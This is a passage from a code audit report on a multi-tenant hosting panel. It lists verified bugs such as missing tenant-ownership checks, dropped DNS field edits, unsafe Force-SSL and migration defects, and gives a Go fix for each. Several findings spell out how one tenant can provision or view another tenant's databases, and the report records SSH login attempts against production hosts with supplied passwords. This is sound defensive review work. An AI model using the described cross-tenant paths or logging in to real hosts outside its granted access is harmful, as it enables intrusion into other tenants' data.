          client := &services.TerminalClient{Send: make(chan []byte, 256)}
          hub.Register(client)
          defer hub.Unregister(client)
          ... (existing reader/writer loops unchanged)
      }
  }

  And main.go:491:
      app.Get("/ws/install-terminal", websocket.New(handlers.NewInstallTerminalWSHandler(cfg.JWTSecret)))

2) Frontend — EmailServerInstall.tsx:130, append the access token so the legit feature keeps working:
      const token = useAuthStore.getState().accessToken;
      const wsUrl = `${protocol}//${window.location.host}/ws/install-terminal?token=${encodeURIComponent(token ?? "")}`;

(Optional hardening: also tenant-scope the install hub so vendor_admin only sees their own installs, but that is beyond the minimal auth fix.)

---

## 11. [high] UpdateRecord silently drops priority/weight/port/caa_flag/caa_tag edits (MX priority change is a no-op reported as success)
- file: backend/internal/services/dns_service.go
- line: 827-869
- fixSafe: True
- reason: Verified against the actual code. UpdateRecord (dns_service.go:827-869) builds setFields from only name/type/value/ttl; it never reads priority/weight/port/caa_flag/caa_tag from the updates map. After FindOneAndUpdate, reconcileRRSet -> formatRecordValueForPDNS (lines 577-606) re-emits the OLD *rec.Priority/*rec.Weight/*rec.Port/*rec.CAAFlag/rec.CAATag from the unchanged Mongo row, so an MX priority edit is lost while the handler returns 200 (dns_handler.go:138-141) and the UI shows 'DNS record updated'. AddRecord (lines 758-762) DOES persist all five aux fields, confirming the inconsistency. Reachable: PUT /api/v1/whm/dns/zones/:domain/records/:id (whm_routes.go:289, dns.manage) and the cPanel mirror (cpanel_routes.go:297) -> DNSHandler.UpdateRecord -> service.UpdateRecord; the by-name fallback UpdateRecordByNameType (line 1054) delegates to the same function and inherits the bug. The WHM frontend's buildPayloadFor (DnsPage.tsx:257-259) sends payload.priority for MX/SRV/CAA on the update path (lines 293, 371). Handler parses JSON into map[string]interface{} so numbers arrive as float64, matching the assertion in the fix. Refinements (bug still real): the WHM UI only exposes one aux input bound to row.priority, so via the UI only MX/SRV priority is lost; weight/port/caa_flag/caa_tag are droppable only by direct API callers. For CAA the UI mislabels that single input 'Flags' but still sends it as priority, and formatRecordValueForPDNS reads CAAFlag (not Priority) for CAA, so CAA-flag-via-UI is a separate pre-existing gap that this priority-mapping fix does not address. None of this refutes the core, concrete, high-severity trigger: editing an MX record's priority is silently lost.

**finalFix:**
In backend/internal/services/dns_service.go UpdateRecord, after the ttl handling (after line 869, before the dup-check block), add aux-field mapping consistent with AddRecord. Numbers from JSON BodyParser arrive as float64; accept explicit null to clear:

	if v, ok := updates["priority"]; ok {
		if f, ok := v.(float64); ok { p := int(f); setFields["priority"] = &p } else if v == nil { setFields["priority"] = nil }
	}
	if v, ok := updates["weight"]; ok {
		if f, ok := v.(float64); ok { w := int(f); setFields["weight"] = &w } else if v == nil { setFields["weight"] = nil }
	}
	if v, ok := updates["port"]; ok {
		if f, ok := v.(float64); ok { p := int(f); setFields["port"] = &p } else if v == nil { setFields["port"] = nil }
	}
	if v, ok := updates["caa_flag"]; ok {
		if f, ok := v.(float64); ok { cf := int(f); setFields["caa_flag"] = &cf } else if v == nil { setFields["caa_flag"] = nil }
	}
	if v, ok := updates["caa_tag"].(string); ok { setFields["caa_tag"] = v }

This makes reconcileRRSet/formatRecordValueForPDNS re-emit the new MX/SRV/CAA aux values. Note: to also fix CAA flag edits FROM the WHM UI, the frontend (DnsPage.tsx buildPayloadFor) must send caa_flag (not priority) for CAA — a separate, optional follow-up; the backend mapping above is the necessary and load-bearing fix for the reported MX/SRV priority loss.

---

## 12. [high] Create() never asserts the caller owns the supplied domain/vendor — cross-tenant database provisioning + cross-tenant visibility
- file: backend/internal/services/database_service.go
- line: 155-275 (resolution block 171-197; no AssertOwnsDomain anywhere in Create)
- fixSafe: True
- reason: Verified against actual code. Create (database_service.go:155-275) never calls scope.AssertOwnsDomain or scope.AssertOwns. The only use of GetCallerScope in Create (line 180) is a fallback to derive the namespace prefix when neither req.Vendor nor req.Domain is supplied — not an ownership assertion. Contrast: GetByID (line 130) DOES call scope.AssertOwnsDomain, and List (line 92) applies scope.ApplyDomainScope("domain"). So Create is the gap. Reachability confirmed: handler Create (database_handler.go:38-51) does zero ownership checks and calls the service directly; the cpanel route group (cpanel_routes.go:17-22) gates POST /api/v1/cpanel/databases only with RequireRole(vendor_admin, vendor_staff, developer, support, customer) + InjectScope — no per-resource permission. In CreateDatabaseRequest (models/database.go:23-36) both Vendor and Domain are OPTIONAL and attacker-controlled (only db_name/type/username/password are required). Attack: tenant demotwo POSTs {domain:"company-demo.local"} (owned by demoone); Create looks up that foreign domain's owner (lines 172-178), sets prefixUser=demoone, prefixes db/user with demoone_, then calls real agent.CreateMongoDatabase/CreateMySQLDatabase (+ CreateMySQLUserWithRole) — all real provisioning functions (agent/mongodb.go:64, agent/mysql.go:51/89), provisioning a live DB+user with a password the attacker chose. The stored Database row gets Domain="company-demo.local" (line 249), which then matches demoone's ApplyDomainScope filter (tenant_scope.go:224-242, domain IN tenantDomains) and surfaces in demoone's List/GetByID/GetConnection — a database demoone never created whose credentials another tenant controls. The cpanel_routes.go:83-84 comment claiming tenant isolation is enforced 'on each :id lookup' is false for Create (which has no :id and no check). Could not refute: no upstream guard exists in the handler, route middleware, or validator.

**finalFix:**
In backend/internal/services/database_service.go, insert an ownership assertion in Create immediately after the prefix-resolution block (after line 197, before the `switch dbType` at line 203):

	// Tenant-scoped callers may only provision under a domain/vendor they own.
	// (vendor_owner / staff are non-tenant-scoped so these asserts no-op for them.)
	if scope := GetCallerScope(ctx); scope != nil && constants.IsTenantScoped(scope.Role) {
		if req.Domain != "" {
			if err := scope.AssertOwnsDomain(ctx, s.db, req.Domain); err != nil {
				return nil, err
			}
		}
		if req.Vendor != "" {
			if err := scope.AssertOwns(ctx, s.db, req.Vendor); err != nil {
				return nil, err
			}
		}
	}

This is surgical: the legitimate fallback (empty Vendor + empty Domain -> caller's own tenant root username, line 179-188) is untouched because the asserts only fire when the respective field is non-empty; WHM owners/staff are not tenant-scoped so the block is skipped. All referenced symbols (constants.IsTenantScoped, scope.AssertOwnsDomain, scope.AssertOwns) already exist and are imported/used in this file. req.Vendor is a linux username per models/database.go:28, matching AssertOwns' contract.

---

## 13. [high] Databases created with empty domain are permanently invisible/unmanageable to the tenant that owns them
- file: backend/internal/services/database_service.go
- line: Create: 244-262 stores Domain=req.Domain (may be ""); GetByID: 129-133 + List: 92-94 scope by domain; AssertOwnsDomain rejects empty domain at tenant_scope.go:250-251
- fixSafe: False
- reason: Code matches the quotes exactly and the path is reachable by a normal vendor. Create (line 249) stores Domain=req.Domain, which is optional (models/database.go:35 comment "Domain is now optional"; no validate:"required" on the field; handler database_handler.go:38-50 binds it through with no domain check). The cpanel frontend (frontend/apps/cpanel/src/pages/DatabasesPage.tsx) initializes form.domain="" (line 126), labels the dropdown "(optional)" (line 697), and only renders it when availableDomains.length>0 (line 694) — so a vendor with no domains, or one who simply leaves it blank, POSTs domain:"" to /api/v1/cpanel/databases. Create still succeeds (it only uses caller scope to derive the db-name prefix, lines 179-197). InjectScope (middleware/tenant_scope.go:16-29) is wired into the cpanel group (cpanel_routes.go:19) and constants.IsTenantScoped returns true for every non-owner role, so the scope is active. After creation: List calls ApplyDomainScope -> filter{domain:{$in:[tenant domains]}} (tenant_scope.go:238-239), and TenantDomains only collects non-empty domains (tenant_scope.go:211-214), so a domain:"" row can never match -> invisible in List. GetByID calls AssertOwnsDomain(dbDoc.Domain) which short-circuits on empty domain with "domain required" (tenant_scope.go:250-251) -> GetByID returns "database not found" (database_service.go:131). Every per-id op (Get, Delete, GetConnectionInfo, GetPhpMyAdminInfo, CreateUser, DeleteUser, UpdateOwnerPassword, UpdateUserPassword, UpdateUserRole, AddAccessHost, RemoveAccessHost) routes through GetByID and therefore fails for the owning vendor. Only vendor_owner (unscoped, IsTenantScoped=false) can still see/manage the row. There is no upstream guard: Create neither rejects an empty domain for tenant callers nor stamps any alternative owner identity that scoping could match — yet the underlying engine DB/user is really created. This orphans real databases via the panel's own designed flow. I could not independently re-confirm the runtime rows over SSH (port 22 to 187.127.179.98 is firewalled; 187.127.155.209 rejects the provided demo password for root login — that password is the panel login, not SSH root), but the static path is conclusive on its own and consistent with the hunter's reported production rows (demoone_appdata / demotwo_appdb with domain:"").

**finalFix:**
Stamp an owning-username on every Database row and make tenant scoping accept it in addition to domain, so domain-less DBs stay visible to their creator without removing the "domain optional" feature.

1) models/database.go (after line 14, the Domain field) — add an owner field:
   Owner string `bson:"owner,omitempty" json:"owner"`

2) database_service.go Create — capture the resolved prefixUser and persist it. The prefixUser is already computed at lines 171-197; just store it. In the dbRecord literal (lines 244-255) add:
   Owner: prefixUser,
   (prefixUser is the tenant-root username for cPanel callers; for WHM it is the vendor/domain owner, so the field is populated in all normal flows.)

3) database_service.go List (lines 89-94) — scope by owner OR domain instead of domain alone. Replace the scope block with a helper that ORs the two, e.g.:
   if scope := GetCallerScope(ctx); scope != nil && constants.IsTenantScoped(scope.Role) {
       domains, _ := scope.TenantDomains(ctx, s.db)
       owners, _ := TenantUsernames(ctx, s.db, scope.TenantHex)
       filter = bson.M{"$or": bson.A{
           bson.M{"domain": bson.M{"$in": domains}},
           bson.M{"owner": bson.M{"$in": owners}},
       }}
   }

4) database_service.go GetByID (lines 129-133) — allow ownership via owner too:
   if scope := GetCallerScope(ctx); scope != nil && constants.IsTenantScoped(scope.Role) {
       okDomain := scope.AssertOwnsDomain(ctx, s.db, dbDoc.Domain) == nil
       okOwner := dbDoc.Owner != "" && scope.AssertOwns(ctx, s.db, dbDoc.Owner) == nil
       if !okDomain && !okOwner {
           return nil, fmt.Errorf("database not found")
       }
   }

5) One-time backfill for already-orphaned rows: set owner from the db_name prefix (the substring before the first "_") matched against the users collection, or simply set owner = prefix for the known rows (demoone_appdata -> demoone, demotwo_appdb -> demotwo) so existing tenants regain access.

Note: this is NOT a one-line fix — it touches the model, Create, List, GetByID, and needs a backfill migration, so it should be reviewed and tested (especially that WHM owner-unscoped behaviour is unchanged, which it is because IsTenantScoped is false for vendor_owner). A smaller-but-feature-breaking alternative is to reject empty domain for tenant-scoped callers in Create, but that removes the deliberately-supported "domain optional" UX and still strands the existing orphaned rows.

---

## 14. [high] UpdateService env-var changes never reach the running backend (no .env rewrite, no systemd unit regen)
- file: backend/internal/services/project_service.go
- line: 1960-1977, 2025-2027
- fixSafe: True
- reason: Verified every link in the chain. (1) Env is persisted ONLY two ways at AddService time: writeFileAsUser(...".env"...) at project_service.go:1670 and baked into the systemd unit's Environment= lines via CreateSystemdUnit (1700-1748 -> deploy.go:90-92 `Environment=K=V`). deploy.go has NO EnvironmentFile= for project units (grep confirms EnvironmentFile only in mail_suite_install.go), so the unit reads env solely from those baked lines. (2) In UpdateService (1852-2029), when req.EnvVars != nil it only $set's env_vars/missing_env_keys/status in Mongo (1960-1977); there is NO writeFileAsUser(.env) anywhere in the function (the only .env write in the file is line 1670, inside AddService). (3) On an env-only edit runtimeChanged is false, so the unit-rebuild block (2004-2024) is skipped and control hits `else if needsRestart && svc.Role=="backend" { systemctl restart svc.SystemdUnit }` (2025-2027) — a restart of the OLD on-disk unit with stale Environment= lines and stale .env. (4) Redeploy does not rescue it either: runDeploy recreates the unit only when the unit FILE is missing (3175), else just `systemctl restart` (3192). So edited env never reaches the process until runtime_version changes (forcing the 2004 block) or the unit file is hand-deleted. Reachability confirmed: UpdateServiceRequest.EnvVars is *map[string]string (models/project.go:304); handler passes req straight through (project_handler.go:464-469); routed at whm_routes.go:715 and cpanel_routes.go:338 (PUT /:id/services/:svc) for vendor_owner and vendor_admin/staff. Contrast app_service.go:939-962 which correctly rewrites .env and regenerates ecosystem.config.js on env change. The candidate's quotes, line numbers, and logic all check out.

**finalFix:**
In project_service.go UpdateService, (A) after the DB UpdateOne (~line 1980) write .env on disk when env changed, and (B) widen the unit-rebuild condition so it also fires on env edits (the 2004-2024 block already reloads updated.EnvVars + PORT + PATH and rewrites the unit, exactly what's needed).

(A) Right after the `if _, err := s.db...UpdateOne(...)` block, add:
```go
if req.EnvVars != nil && svc.InstallDir != "" {
    wd := svc.InstallDir
    if proj, _ := s.loadProject(ctx, svc.ProjectID); proj == nil || proj.ProjectDir == "" {
        wd = serviceWorkDir(svc.InstallDir, svc.GitSubpath)
    }
    var lines []string
    for k, v := range *req.EnvVars {
        lines = append(lines, fmt.Sprintf("%s=%s", k, v))
    }
    writeFileAsUser(ctx, filepath.Join(wd, ".env"), strings.Join(lines, "\n")+"\n", svc.User, "0600")
}
```

(B) Change line 2004 from:
```go
if runtimeChanged && svc.Role == "backend" && svc.SystemdUnit != "" {
```
to:
```go
if (runtimeChanged || req.EnvVars != nil) && svc.Role == "backend" && svc.SystemdUnit != "" {
```
This reuses the existing block (2005-2024) which re-reads updated.EnvVars from the freshly-persisted row, rebuilds Environment=, PORT and PATH, rewrites the unit, daemon-reloads and restarts — so the new env lands. The plain-restart else-branch (2025-2027) still covers other needsRestart cases (e.g. start_cmd). This mirrors AddService and AppService.Update, so no working feature regresses.

---

## 15. [high] Static app's nginx vhost is not rebuilt on migration; recoverApp returns early and healMissingVhosts misclassifies it as a PHP domain
- file: backend/internal/services/transfer_panel_records.go
- line: 1450-1456 and 2535-2579
- fixSafe: True
- reason: Code matches the candidate's quotes and the trigger path is real and reachable through the documented Server Transfer pipeline (RunRecords -> tryStartSyncedApps->recoverApp at line 345, then healMissingVhosts at line 359).

Chain verified in code:
1) AppService.Deploy (app_service.go:243-260, 467-479, 595-642) deploys a static app with isStatic=true => NO port allocation (Port stays 0), StartCmd left empty, AppType="static", InstallPath=appDir, Framework persisted. The static vhost is created via agent.CreateStaticVhost rooted at appWorkDir+preset.StaticDir (e.g. /home/<user>/apps/<name>/dist). nginx vhosts live in /etc/nginx, not under /home/<user>/, so they do NOT ride the file transfer (confirmed by the file's own comments at lines 1337, 1399).
2) materializeReferencedDomains (line 336, runs BEFORE healMissingVhosts) inserts a domains-collection row for apps.domain with php_version=8.2, status=active (lines 1258-1316). The candidate omitted this, but it GUARANTEES the static app's domain is present in ColDomains for the heal pass — strengthening the bug.
3) recoverApp: renderStartCmd(app.StartCmd="", app.Port=0) returns "" (app_presets.go:758), so the early return at lines 1451-1456 fires and NO CreateStaticVhost/CreateStaticVhostWithSSL is ever called. Confirmed empty start_cmd + port 0 is the real static-app shape.
4) healMissingVhosts: the domain has no vhost file (os.Stat at 2520 misses), appErr==nil but app.Port==0 so the app branch (line 2535 requires app.Port>0) is skipped; no project_service; it falls through to the PHP-FPM branch (lines 2574-2579) writing agent.CreateVhost rooted at defaultDocRoot = /home/<user>/domains/<domain>/public_html (nginx.go:181) with a PHP try_files/index.php fallback. That is the wrong docroot and wrong SPA fallback; the SPA's built assets at install_path/<staticDir> are never served, so the domain 404s/serves placeholder while the App page shows status=running.

Cross-check that proves the asymmetry: static project_services (role frontend/static, also Port==0) are protected because recoverProjectService/buildRecoveryVhostSpec (lines 1673-1693) writes the correct static vhost during recovery, so the vhost file exists and healMissingVhosts skips it. The App path has no equivalent static handling in recoverApp, so it is left exposed. The served dir IS reconstructable from the App model (lookupPreset(app.Framework)+app.InstallPath, the exact pattern already used at ssl_service.go:786-787), so the candidate's "info is never reconstructed" is slightly overstated, but the operative claim — recoverApp/healMissingVhosts never rebuild a static vhost and misroute it to PHP — is correct.

Live runtime confirmation was attempted but not completed: the default SSH host (187.127.179.98:22) is unreachable, the migration-target S2 (195.35.7.64) rejected the provided password, and SSHing into the other production hosts named only in the deliverables doc was outside the granted scope. The code path is conclusive on its own.

**finalFix:**
Make recoverApp rebuild the static vhost before the empty-startCmd early return, mirroring AppService.Deploy / ssl_service.go:786-787. This writes the vhost file before healMissingVhosts runs, so the heal pass skips it (exactly like the protected project_service path) — no change needed in healMissingVhosts.

In backend/internal/services/transfer_panel_records.go, replace the early-return block at lines 1450-1456:

    startCmd := renderStartCmd(app.StartCmd, app.Port)
    if strings.TrimSpace(startCmd) == "" {
        // Static apps (and apps without a start_cmd) are served by nginx
        // directly. The static vhost lives in /etc/nginx and does NOT ride
        // the file transfer, so rebuild it here from the App's framework
        // preset (mirrors AppService.Deploy and ssl_service.go static path).
        if app.AppType == "static" && app.Domain != "" {
            servedDir := appWorkDir(app)
            if p, ok := lookupPreset(app.Framework); ok && p.StaticDir != "" {
                servedDir = filepath.Join(appWorkDir(app), p.StaticDir)
            }
            if agent.LetsEncryptCertExists(app.Domain) {
                if err := agent.CreateStaticVhostWithSSL(ctx, app.Domain, servedDir, "", ""); err != nil {
                    return fmt.Errorf("static vhost (SSL): %w", err)
                }
            } else {
                if err := agent.CreateStaticVhost(ctx, app.Domain, servedDir); err != nil {
                    return fmt.Errorf("static vhost: %w", err)
                }
            }
        }
        return nil
    }

(Optional belt-and-braces, for the case recoverApp didn't run, e.g. the app's user wasn't in `picked`: add, before the PHP-FPM fallthrough at line 2564 in healMissingVhosts, a static branch:

    if appErr == nil && app.AppType == "static" {
        servedDir := appWorkDir(&app)
        if p, ok := lookupPreset(app.Framework); ok && p.StaticDir != "" {
            servedDir = filepath.Join(appWorkDir(&app), p.StaticDir)
        }
        var e error
        if useSSL {
            e = agent.CreateStaticVhostWithSSL(ctx, d.Domain, servedDir, "", "")
        } else {
            e = agent.CreateStaticVhost(ctx, d.Domain, servedDir)
        }
        if e == nil {
            healed++
            s.addLog(ctx, jobID, "info", fmt.Sprintf("Healed missing static vhost for %s", d.Domain), "vhost-heal")
        }
        continue
    }

) Both edits are additive and only affect static apps, which are currently broken, so no working feature is at risk.

---

## 16. [high] Single-domain Force-SSL has no certificate guard — enabling it on a cert-less domain breaks the site (forced redirect to a non-existent HTTPS listener)
- file: backend/internal/services/ssl_service.go
- line: 819-843 (SSLService.ForceSSL) calling backend/internal/agent/nginx.go:1119-1162 (agent.ForceSSL)
- fixSafe: True
- reason: Verified in source. SSLService.ForceSSL (ssl_service.go:819-843) calls agent.ForceSSL(ctx, domain, enable) with zero checks on cert/SSLActive state. agent.ForceSSL (nginx.go:1119-1162) injects `return 301 https://$host$request_uri;` right after the server_name line unconditionally when enable==true (lines 1129-1146), then reloads. A `return 301` at server context is valid nginx so `nginx -t` passes and the config commits. The HTTP-only vhost templates (vhostTemplate l44-66, CreateStaticVhost, CreateReverseProxy) emit ONLY `listen 80;` — only the *WithSSL variants add `listen 443 ssl;`. So a cert-less domain has no 443 listener; after the flip every http:// request 301s to https://, which has no TLS listener -> connection refused. The asymmetry is real and intentional in the bulk path: runForceSSLOne (domain_bulk_refresh.go:298) does `if enable && !d.SSLActive { row.Skipped = \"no SSL cert — issue / reissue first\"; return }` with a comment that turning on Force HTTPS for an HTTP-only domain would 502 it; the single path bypasses this entirely. Reachable by three real callers, all routing to SSLService.ForceSSL with no upstream guard: WHM POST /api/v1/whm/ssl/:domain/force-ssl (whm_routes.go:326 -> SSLHandler.ForceSSL ssl_handler.go:217-233), cPanel POST /api/v1/cpanel/ssl/:domain/force-ssl (cpanel_routes.go:176, same handler), and programmatic POST /api/v1/ssl/:domain/force (api_routes.go:85 -> ProgrammaticHandler.ForceSSL programmatic_handler.go:111-125, which even DEFAULTS enable=true when the body omits it). The agent runs in-process (executor.go RunCommand uses exec.CommandContext on the host), so this mutates the live nginx config on the panel host directly. Domain.SSLActive exists (models/domain.go:20) so the fix is implementable. Could NOT complete the live SSH confirmation (port 22 reachable on 89.116.34.207 but the supplied password was rejected — credentials appear rotated), but the runtime claim is fully corroborated by the code: cert-less domains provably get HTTP-only vhosts and no 443 block is generated for them.

**finalFix:**
In backend/internal/services/ssl_service.go, add a cert guard at the top of SSLService.ForceSSL (currently line 819), mirroring the bulk guard in runForceSSLOne (domain_bulk_refresh.go:298). Only block the enable path; leave disable/revert open:

func (s *SSLService) ForceSSL(ctx context.Context, domain string, enable bool) error {
	// Refuse to force HTTPS on a domain with no live cert — the HTTP-only
	// vhost has no `listen 443` block, so the injected 301 would redirect
	// every request to a non-existent TLS listener (ERR_CONNECTION_REFUSED).
	// Mirrors runForceSSLOne (domain_bulk_refresh.go). Disabling is always allowed.
	if enable {
		if d, err := s.lookupDomain(ctx, domain); err == nil && !d.SSLActive {
			return fmt.Errorf("cannot force HTTPS: no SSL certificate is active for %s — issue a certificate first", domain)
		}
	}
	// Update nginx config
	if err := agent.ForceSSL(ctx, domain, enable); err != nil {
		return fmt.Errorf("failed to update nginx config: %w", err)
	}
	... (rest unchanged)
}

Note: lookupDomain already exists at ssl_service.go:846. Using `err == nil && !d.SSLActive` avoids breaking flows where the domain row is absent but a cert genuinely exists; if a stricter check is preferred, gate on agent.LetsEncryptCertExists(domain) instead.

---

## 17. [high] Cross-tenant info disclosure: DatabaseHandler.ListUsers and ListAccessHosts skip the GetByID/AssertOwnsDomain scope check every sibling method has
- file: backend/internal/handlers/database_handler.go
- line: 61-68 (ListUsers) and 175-181 (ListAccessHosts); root cause in backend/internal/services/database_service.go:314-335 and 680-701
- fixSafe: True
- reason: Verified the code matches the candidate exactly. DatabaseService.ListUsers (database_service.go:314-335) does `oid := ObjectIDFromHex(dbID)` then `col.Find(ctx, bson.M{"database_id": oid})` with no scope check; ListAccessHosts (680-701) does the same on db_access_hosts. Every other id-keyed method (CreateUser:338, DeleteUser:372, AddAccessHost:717, RemoveAccessHost:779, etc.) first calls s.GetByID(ctx,id) which runs scope.AssertOwnsDomain (129-133) and returns "database not found" for a foreign id. Reachability confirmed: cpanel_routes.go:94 GET /databases/:id/users and :99 GET /databases/:id/access-hosts sit in a group gated only by role membership (vendor_admin/vendor_staff/developer/support/customer) + InjectScope, with no per-route ownership gate; the group comment (cpanel_routes.go:82-86) explicitly promises "scope.AssertOwnsDomain on each :id lookup", which these two methods violate. Handlers pass c.UserContext() (database_handler.go:63, 176) so the CallerScope IS present on the context — the service simply never consults it. The Find filters carry no tenant restriction (no ApplyTo/ApplyDomainScope). For a tenant-scoped caller, AssertOwnsDomain (tenant_scope.go:246-263) limits to TenantDomains; bypassing it lets any tenant role pass another tenant's database ObjectID and get 200 with that DB's usernames+roles (DatabaseUser.Username json:"username", .Role json:"role"; Password is json:"-" so plaintext is not leaked) and allowed hosts+comments (DBAccessHost.Host/.Comment). Control endpoint Get (GetByID) returns "Database not found" for the same foreign id — confirmed asymmetry. Disclosure is reconnaissance-grade (usernames/roles/hosts), not credential theft, consistent with high (not critical) severity.

**finalFix:**
Add the same GetByID scope gate the sibling methods use, then query by the verified record's ID. IsTenantScoped returns role != RoleVendorOwner (constants.go:22-24), so GetByID returns nil-error for vendor_owner (AssertOwnsDomain short-circuits at tenant_scope.go:247-249), preserving WHM/owner behavior; tenant-scoped callers get "database not found" for foreign ids.

In backend/internal/services/database_service.go, ListUsers (314-335) — replace the ObjectIDFromHex block with:
    dbRecord, err := s.GetByID(ctx, dbID)
    if err != nil {
        return nil, fmt.Errorf("database not found: %w", err)
    }
    col := s.db.Collection(database.ColDBUsers)
    cursor, err := col.Find(ctx, bson.M{"database_id": dbRecord.ID})
(drop the now-unused `oid`; keep the rest of the method unchanged.)

In ListAccessHosts (680-701) — replace the ObjectIDFromHex block with:
    dbRecord, err := s.GetByID(ctx, dbID)
    if err != nil {
        return nil, fmt.Errorf("database not found: %w", err)
    }
    cur, err := s.db.Collection(database.ColDBAccessHosts).Find(ctx,
        bson.M{"database_id": dbRecord.ID},
        options.Find().SetSort(bson.D{{Key: "created_at", Value: 1}}),
    )
(drop the now-unused `oid`; keep the rest unchanged.)

---

## 18. [medium] mirrorPanelUsers assigns a self-referencing tenant_id to non-root team members inserted before their tenant root, breaking tenant scoping
- file: backend/internal/services/transfer_panel_records.go
- line: 809-847 (esp. 827-836)
- fixSafe: True
- reason: Code verified exactly as quoted (lines 809-847). Step 3 inserts non-owner users in mongoexport NATURAL order (RemoteMongoExport, backend/internal/agent/transfer.go:1575/1580 uses find($QUERY) with no .sort()), so a team member can precede its vendor_admin. normaliseDoc (lines 1077-1091) remaps tenant_id via idMap but, when the ref isn't yet in idMap, RETAINS the original source ObjectID (1082-1088). The in-loop block (827-833) re-tries the same idMap and also misses; the self-ref fallback (834-836) does NOT fire because tenant_id is present. Net: a vendor_staff/developer/support/customer whose vendor_admin appears later in the export keeps a tenant_id pointing at the SOURCE vendor_admin _id — which has no matching document on the destination (the dst admin got a fresh newOID).

Data shape confirmed in user_service.go Create (lines 369-392): tenant roots (vendor_owner/vendor_admin) self-own; everyone else inherits caller.TenantID. A vendor_admin's team member therefore carries tenant_id == vendor_admin._id (a non-self, non-owner ref). The candidate also independently confirmed this live (demo@betazeninfotech.com tenant_id == owner _id). Multi-level tenancy is a real product feature: only vendor_owner creates vendor_admin (lines 263-265), and vendor_admin creates staff/customer in its own tenant.

Impact via tenant_scope.go: at login the mis-stamped user's scope TenantHex = resolveTenantID = its (stale source) tenant_id. TenantUsernames matches tenant_id==tid OR _id==tid; neither matches the real destination admin tenant, so the user is scoped to only co-mis-stamped peers — a cross-tenant correctness/isolation defect (sees a wrong/partial roster + resources). The owner-tenanted case works only because the owner is mapped in Step 1 before Step 3. The author's comment (823-826) anticipated only the self-ref/owner case, not vendor_admin-as-tenant-root, so the hazard is real and unguarded.

Reachability: vendor_owner Server Transfer where the source roster has team members under a vendor_admin and natural export order returns a member before its admin. No downstream pass corrects it: mirrorPanelUsers runs first and is the authoritative roster writer; syncUsersForTransfer (line 86) then hits the email-FindOne reuse branch (581-588) and does not rewrite tenant_id. Severity medium (not high): requires multi-level source + unfavorable order; affected principals are staff/customer and generally see LESS, not an escalation. I could not run the live SSH confirmation (sandbox blocked SSH into the agent-inferred production host), but the static analysis is decisive and the candidate's live evidence already established the data shape.

**finalFix:**
Add a second pass at the end of mirrorPanelUsers (after the Step 3 insert loop, just before `return idMap, emails` at line 848) that re-resolves any user whose stored tenant_id is a source OID now present in the complete idMap. This needs the source tenant_id remembered per inserted user, so capture it in the loop and fix up afterwards:

In the Step 3 loop (around line 819-822), before normaliseDoc rewrites tenant_id, record the raw source tenant hex and the new _id:

    oldID := extractOID(d["_id"])
    newOID := primitive.NewObjectID()
    srcTenantHex := extractOID(d["tenant_id"]) // NEW: remember source tenant ref
    insert := s.normaliseDoc(d, idMap)
    insert["_id"] = newOID

(keep the existing 827-836 block unchanged for the in-order/self-ref cases). Track pending fixups, e.g. declare near the top of the loop scope:

    type pendingTenant struct{ newOID primitive.ObjectID; srcTenantHex string }
    var pending []pendingTenant   // declared once before the for-loop

and inside the loop, after a successful InsertOne (after line 845):

    if srcTenantHex != "" {
        pending = append(pending, pendingTenant{newOID: newOID, srcTenantHex: srcTenantHex})
    }

Then, after the loop and before `return idMap, emails` (line 848), with idMap now complete:

    for _, p := range pending {
        if mapped, ok := idMap[p.srcTenantHex]; ok {
            // tenant root now known: point the member at the dst tenant root.
            _, _ = col.UpdateByID(ctx, p.newOID, bson.M{"$set": bson.M{"tenant_id": mapped}})
        } else if p.srcTenantHex == "" {
            // (already handled by the self-ref fallback during insert)
        }
        // else: source tenant root genuinely absent from the roster — leave as-is
    }

This is surgical: it only corrects rows whose source tenant_id became resolvable once all users were inserted, leaving the already-correct owner-tenanted and in-order cases untouched. (Equivalent alternative: topologically order docs so role in {vendor_owner,vendor_admin} insert before their team members; the two-pass fixup is lower-risk because it doesn't reorder the insert loop.)

---

## 19. [medium] Flusher 1-hour hard-age cap reintroduces duplicate + phantom 'stuck' rows for mail deferred > 1h (LogKey embeds firstSeen) — regression in the BUG-1 fix
- file: backend/internal/services/mail_log_service.go
- line: 413 (LogKey = fmt.Sprintf("%s:%d", e.queueID, e.firstSeen.Unix())) and 513 (if e.removed || e.firstSeen.Before(hardCutoff) { delete(...) })
- fixSafe: False
- reason: Code matches the report exactly: LogKey = "<queueID>:<firstSeen.Unix()>" (line 413), the flusher deletes a NON-removed partial once e.firstSeen.Before(hardCutoff) where hardCutoff = now - mailLogMaxAge (1h) (lines 495,513), and on re-creation a fresh partial is built with firstSeen = current line ts (line 237) — there is NO recovery of the prior firstSeen. Reachability is genuine: Postfix default maximal_queue_lifetime is 5 days and maximal_backoff_time ~66 min, so a message deferred past 1h (greylisting repeats, down/unreachable MX, over-quota recipient) sits idle (>3min, line 498 cutoff) AND becomes >1h old, satisfying line 513's delete of a still-queued item. The very next retry/delivery/bounce line finds s.partial[qid]==nil (line 230) and recreates the partial with a NEW firstSeen, yielding a DIFFERENT LogKey, so upsert (lines 473-477, keyed on log_key) INSERTS a second row instead of updating the first. The original row — written by the idle flusher at +3min with Queued=true/status=deferred (lines 502-504, 434, 606) — is never touched again and persists as a phantom "stuck/deferred" row. Confirmed there is exactly one writer to ColMailLogs (only line 473) and no corrective sweep; the only cleanup is a 90-day created_at TTL (indexes.go:245), so the phantom survives ~90 days, inflating Stats by_status.deferred and Total (lines 718-749) and the per-message List view (line 686). This is precisely the BUG-1 regression the comment at lines 506-512 claims to have fixed; the 1h cap merely moved the duplicate threshold from 3min to 1h. Adversarial checks all failed to refute: LogKeys differ (no overwrite), firstSeen is never persisted/recovered, and no Dovecot/webhook path corrects these rows.

**finalFix:**
Do NOT use the report's primary fix (LogKey = queueID+":"+serverIP): keying purely on the recycled queue id breaks the deliberate recycle-protection documented at mail_log.go:30-32 and indexes.go:227-230 (Postfix reuses qids over days/weeks; two unrelated messages would merge into one row). Keep firstSeen in the key but make re-creation RECOVER the original firstSeen so the LogKey stays stable, preserving recycle-protection via a recency window.

In parseLine, replace the re-create block (mail_log_service.go ~lines 231-239):

    e := s.partial[qid]
    if e == nil {
        if len(s.partial) >= mailLogMaxPartial {
            s.evictOldestLocked()
        }
        first := ts
        // Recover firstSeen if this qid was recently evicted-but-still-queued,
        // so the LogKey (qid:firstSeen) stays stable and we update the same row
        // instead of creating a duplicate + leaving a phantom "deferred" row.
        // Bounded by maximal_queue_lifetime so a recycled qid weeks later does
        // NOT merge into the old message.
